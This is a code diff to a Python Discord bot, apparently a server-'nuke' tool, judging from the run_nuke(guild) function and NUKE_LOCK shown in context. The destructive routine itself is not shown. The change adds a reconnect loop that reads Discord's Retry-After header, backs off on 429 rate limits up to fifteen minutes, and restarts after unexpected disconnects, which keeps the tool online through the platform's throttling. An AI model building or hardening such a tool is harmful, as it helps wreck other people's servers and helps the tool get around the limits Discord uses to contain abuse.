@@ -219,6 +219,9 @@ bot = commands.Bot(
 
 NUKE_LOCK = asyncio.Lock()
 
+# 再接続バックオフの状態(ready に到達したら 30 秒に戻す)
+RETRY = {"delay": 30.0}
+
 
 # ========================= ヌケ本体 =========================
 async def run_nuke(guild: discord.Guild) -> None:
@@ -455,6 +458,7 @@ async def leave_cmd(ctx: commands.Context):
 
 @bot.event
 async def on_ready():
+    RETRY["delay"] = 30.0          # 正常接続できたらバックオフをリセット
     log.info("ログイン完了: %s (%s) | %d guilds",
              bot.user, bot.user.id, len(bot.guilds))
     log.info("招待URL: https://discord.com/oauth2/authorize?client_id=%s"
@@ -468,18 +472,65 @@ async def on_command_error(ctx, error):
     log.warning("command error: %s", error)
 
 
+# ===================== 接続(429耐性つき) =====================
+def _retry_after_of(e: discord.HTTPException) -> float | None:
+    """Discordが返す Retry-After ヘッダを読む"""
+    try:
+        ra = e.response.headers.get("Retry-After")
+        if ra is not None:
+            return float(ra)
+    except Exception:
+        pass
+    return None
+
+
+async def runner() -> None:
+    """ログイン429を食らってもプロセスを落とさず自動復帰する"""
+    attempt = 0
+
+    while True:
+        attempt += 1
+        try:
+            log.info("接続開始 (試行 %d)", attempt)
+            await bot.start(TOKEN)
+            log.info("正常終了")
+            return
+
+        except discord.LoginFailure:
+            log.error("トークンが不正です")
+            raise
+
+        except discord.PrivilegedIntentsRequired:
+            log.error("=" * 60)
+            log.error("特権インテントがDeveloper PortalでOFFです")
+            log.error("Botページ -> Privileged Gateway Intents で")
+            log.error("  SERVER MEMBERS INTENT / MESSAGE CONTENT INTENT")
+            log.error("を両方ONにして Save -> 再起動してください")
+            log.error("https://discord.com/developers/applications/%s/bot",
+                      bot.application_id or "APP_ID")
+            log.error("=" * 60)
+            raise
+
+        except discord.HTTPException as e:
+            if e.status != 429:
+                log.exception("HTTP %s で切断", e.status)
+                raise
+            wait = _retry_after_of(e) or RETRY["delay"]
+            log.warning("429 (グローバル制限)。%.0f 秒待って再接続します …", wait)
+            await asyncio.sleep(wait)
+            RETRY["delay"] = min(RETRY["delay"] * 1.7, 900.0)   # 30s -> 51s -> ... 最大15分
+            continue
+
+        except Exception:
+            log.exception("想定外の切断。10 秒後に再接続")
+            await asyncio.sleep(10)
+            continue
+
+
 if __name__ == "__main__":
     if not TOKEN:
         raise SystemExit("環境変数 DISCORD_TOKEN が未設定です")
     try:
-        bot.run(TOKEN, reconnect=True)
-    except discord.PrivilegedIntentsRequired:
-        log.error("=" * 60)
-        log.error("特権インテントがDeveloper PortalでOFFです")
-        log.error("Botページ -> Privileged Gateway Intents で")
-        log.error("  SERVER MEMBERS INTENT / MESSAGE CONTENT INTENT")
-        log.error("を両方ONにして Save -> 再起動してください")
-        log.error("https://discord.com/developers/applications/%s/bot",
-                  bot.application_id or "APP_ID")
-        log.error("=" * 60)
-        raise SystemExit(1)
+        asyncio.run(runner())
+    except (KeyboardInterrupt, SystemExit):
+        pass
